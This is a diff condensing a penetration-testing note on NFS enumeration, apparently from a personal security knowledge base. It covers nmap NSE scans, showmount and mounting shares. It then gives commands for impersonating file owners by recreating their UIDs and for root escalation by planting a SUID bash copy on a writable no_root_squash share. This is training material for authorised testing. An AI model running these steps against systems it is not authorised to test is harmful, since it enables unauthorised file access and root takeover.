@@ -1,104 +1,24 @@
 
 # NFS
 
-Layer 3 enumeration. NFS (Network File System) is a distributed file system protocol developed by Sun Microsystems. Its purpose is the same as SMB -- share filesystems over a network as if they were local -- but it uses a completely different protocol and is native to Linux/Unix environments. NFS clients cannot communicate with SMB servers and vice versa.
+Layer 3 enumeration. NFS (Network File System) is a distributed file system protocol native to Linux/Unix. Shares filesystems over a network as if they were local. No built-in authentication -- access control relies on client UID/GID mappings, which can be abused.
 
 > [!warning] UID/GID Authentication
-> NFS has no built-in authentication or authorisation mechanism. Access control is handled entirely by the RPC layer using client UID/GID mappings. If you can control your local UID/GID, you can often impersonate users on a mounted share.
+> NFS trusts the UID/GID the client presents. If you can control your local UID, you can often read files owned by another user on the share.
+
+Ports: `2049` TCP/UDP (NFS), `111` TCP/UDP (rpcbind/portmapper)
 
 ---
 
-## Ports
-
-| Port | Protocol | Purpose |
-|------|----------|---------|
-| 2049 | TCP/UDP | NFS service (primary) |
-| 111 | TCP/UDP | RPC portmapper / rpcbind |
-
-NFSv4 and above only require port 2049, which simplifies firewall traversal. Older versions use portmapper on 111 to dynamically assign additional ports for `mountd`, `nlockmgr`, etc.
-
----
-
-## NFS Versions
-
-| Version | Key Features                                                                                                                                                                      |
-| ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| NFSv2   | Legacy. Originally UDP only. Widely supported.                                                                                                                                    |
-| NFSv3   | Variable file sizes, better error reporting. Not fully backwards compatible with NFSv2.                                                                                           |
-| NFSv4   | Kerberos support, stateful protocol, ACLs, firewall-friendly (single port 2049), no portmapper required. First version to authenticate users rather than just the client machine. |
-| NFSv4.1 | Adds pNFS (parallel NFS) for distributed/clustered storage and session trunking (multipathing).                                                                                   |
-
----
-
-## How Authentication Works
-
-NFS delegates authentication entirely to the RPC protocol. The most common method is UNIX UID/GID:
-
-- The server trusts the UID/GID the client presents
-- The server maps those IDs to its own local users and applies the corresponding filesystem permissions
-- There is no server-side verification of whether the client's UID mapping is legitimate
-- If the client and server have different UID/GID to username mappings, access decisions will be based on the numeric ID alone
-
-This is why NFS with UNIX authentication should only be used on trusted internal networks, and why mismatched UID mappings are a common privilege escalation vector.
-
----
-
-## Configuration
-
-Config file: `/etc/exports`
-
-Defines which directories are shared, to which hosts, and with what options:
-
-```bash
-cat /etc/exports
-```
-
-### Export Options
-
-| Option | Description |
-|--------|-------------|
-| `rw` | Read and write permissions |
-| `ro` | Read only permissions |
-| `sync` | Synchronous data transfer (slower, safer) |
-| `async` | Asynchronous data transfer (faster, less safe) |
-| `secure` | Restrict to ports below 1024 (root-owned ports only) |
-| `insecure` | Allow ports above 1024 |
-| `no_subtree_check` | Disable subdirectory tree checking. Improves reliability when files are renamed while open. |
-| `root_squash` | Remap root (UID/GID 0) to the anonymous user. Prevents remote root from owning files. |
-
-### Add and Apply an Export
-
-```bash
-echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
-systemctl restart nfs-kernel-server
-exportfs    # verify active exports
-```
-
----
-
-## Dangerous Settings
-
-| Option | Risk |
-|--------|------|
-| `rw` | Allows writing to the share, not just reading |
-| `insecure` | Allows connections from unprivileged ports (above 1024). Any process, not just root, can connect. |
-| `nohide` | Exposes filesystems mounted below an exported directory as part of that export |
-| `no_root_squash` | Remote root retains UID/GID 0 on the share. Combined with write access, this means remote root can own any file on the export. |
-
-> [!danger] no_root_squash
-> If `no_root_squash` is set and the share is writable, you can place a SUID binary on the share as root and execute it to escalate locally. See the privilege escalation note below.
-
----
-
-## Enumeration Workflow
+## Workflow
 
 1. Nmap on ports 111 and 2049 with default scripts
-2. Run `nfs*` NSE scripts to enumerate exports, contents, and stats without mounting
-3. `showmount -e` to list available exports
-4. Mount the share locally and inspect contents
-5. Check file ownership -- use `ls -l` for names, `ls -n` for raw UIDs/GIDs
-6. Look for UID/GID mismatches you can exploit locally
-7. Check for writable shares with `no_root_squash` for privesc potential
+2. Run `nfs*` NSE scripts to enumerate exports and contents without mounting
+3. `showmount -e` to list available exports and allowed client ranges
+4. Mount the share and inspect contents
+5. `ls -n` to get raw UIDs/GIDs of file owners
+6. If UID mismatch opportunity -- create a local user with matching UID and access restricted files
+7. If writable share with `no_root_squash` -- SUID shell privesc
 
 ---
 
@@ -108,48 +28,46 @@ exportfs    # verify active exports
 # Service scan on NFS ports
 sudo nmap -sV -sC -p111,2049 <target>
 
-# Run all NFS NSE scripts (ls, showmount, statfs, rpcinfo)
+# Run all NFS NSE scripts
 sudo nmap --script nfs* -sV -p111,2049 <target>
 ```
 
-The `rpcinfo` script lists all running RPC services, their program numbers, versions, and dynamic ports. The `nfs-ls` script will attempt to list share contents without mounting. The `nfs-showmount` script shows available exports.
+| Script | What It Does |
+|--------|-------------|
+| `nfs-ls` | Lists share contents and permissions without mounting |
+| `nfs-showmount` | Shows available exports and allowed client ranges |
+| `nfs-statfs` | Filesystem stats (size, used, available) |
+| `rpcinfo` | Lists all running RPC services with ports and versions |
 
 ---
 
 ## showmount
 
-Query the server's mountd to list available exports:
-
 ```bash
 showmount -e <target>
 ```
 
-Returns the export path and the allowed client range (e.g. `10.129.14.0/24` or `*` for everyone).
+Returns export paths and allowed client ranges. `*` means any host can mount -- enumerate immediately.
 
 ---
 
 ## Mounting and Inspecting
 
 ```bash
-# Create mount point
 mkdir target-NFS
-
-# Mount the NFS share (nolock avoids needing lockd on older exports)
 sudo mount -t nfs <target>:/ ./target-NFS/ -o nolock
 
-# Navigate and inspect
-cd target-NFS
-tree .
+# List with usernames (resolved via local /etc/passwd)
+ls -l ./target-NFS/
 
-# List with usernames and group names
-ls -l mnt/nfs/
+# List with raw UIDs/GIDs
+ls -n ./target-NFS/
 
-# List with raw UIDs and GIDs
-ls -n mnt/nfs/
+tree ./target-NFS
 ```
 
 > [!tip] ls -l vs ls -n
-> `ls -l` resolves UIDs/GIDs to names using your local `/etc/passwd` and `/etc/group`. If the server's users don't exist locally, you'll see the numeric IDs anyway. Use `ls -n` to always see the raw numbers, which is what matters for impersonation.
+> Use `ls -n` to see raw UID/GID numbers -- these are what matter for impersonation, not the resolved names.
 
 ---
 
@@ -160,40 +78,35 @@ cd ..
 sudo umount ./target-NFS
 ```
 
-Always unmount cleanly. Leaving NFS shares mounted can cause issues if the target goes down mid-session.
-
 ---
 
 ## UID/GID Impersonation
 
-Because NFS trusts the UID/GID the client presents, you can impersonate a user whose files you can see on the share:
-
-1. Mount the share and run `ls -n` to get the UID of the file owner
-2. Create a local user with that same UID on your attack machine
-3. Switch to that user and read/write files as if you were them on the remote system
+If you see files owned by a UID you don't have access to:
 
 ```bash
-# Create a user with a matching UID (e.g. 1000)
-sudo useradd -u 1000 fakeuser
+# Create a local user with matching UID
+sudo useradd -u <uid> fakeuser
 sudo su fakeuser
 
-# Now read files owned by UID 1000 on the mounted share
-cat ./target-NFS/mnt/nfs/<file>
+# Now read/write files owned by that UID on the mounted share
+cat ./target-NFS/<file>
 ```
 
 ---
 
-## Privilege Escalation via NFS
+## Privilege Escalation via no_root_squash
 
-If `no_root_squash` is set on a writable share and you have SSH access to the target:
+If the share is writable and `no_root_squash` is set:
 
-1. As root on your attack machine, copy a shell binary to the mounted share
-2. Set the SUID bit on it (`chmod +s`)
-3. SSH into the target and execute the binary from the NFS path
-4. The shell runs with the UID of the owner (root) -- privilege escalation achieved
+```bash
+# On attack machine as root -- copy shell and set SUID
+cp /bin/bash ./target-NFS/shell
+chmod +s ./target-NFS/shell
 
-> [!warning]
-> This only works when `no_root_squash` is set. With `root_squash` (the default), your root writes are remapped to the anonymous UID and the SUID bit will not grant elevated access.
+# On target via SSH -- execute it
+/mnt/nfs/shell -p
+```
 
 See [[05-Post-Exploitation/Linux-Privilege-Escalation|Linux Privilege Escalation]] for broader context.
 
@@ -202,9 +115,9 @@ See [[05-Post-Exploitation/Linux-Privilege-Escalation|Linux Privilege Escalation
 ## What to Look For
 
 - **World-readable exports (`*`)** -- any host can mount. Enumerate everything immediately.
-- **no_root_squash on a writable share** -- SUID shell privesc. High severity finding.
-- **insecure option set** -- weakens the port restriction. Lower barrier for exploitation.
-- **SSH keys or credentials on the share** -- `id_rsa`, `.env`, config files with passwords. Pull and inspect anything non-obvious.
-- **UID/GID mismatch opportunity** -- files owned by a UID you can recreate locally. Impersonate and read restricted files.
-- **Backup scripts or cron-adjacent files** -- writable scripts owned by a privileged user are a privesc path if they run on a schedule.
-- **nohide on nested mounts** -- can expose filesystems the admin did not intend to share.
+- **`no_root_squash` on a writable share** -- SUID shell privesc. High severity finding.
+- **`insecure` option set** -- allows connections from unprivileged ports. Lower barrier to exploit.
+- **SSH keys or credentials on the share** -- `id_rsa`, `.env`, config files. Pull and inspect anything non-obvious.
+- **UID/GID mismatch opportunity** -- files owned by a UID you can recreate locally.
+- **Backup or cron-adjacent scripts** -- writable scripts owned by a privileged user are a privesc path.
+- **`nohide` on nested mounts** -- may expose filesystems the admin didn't intend to share.
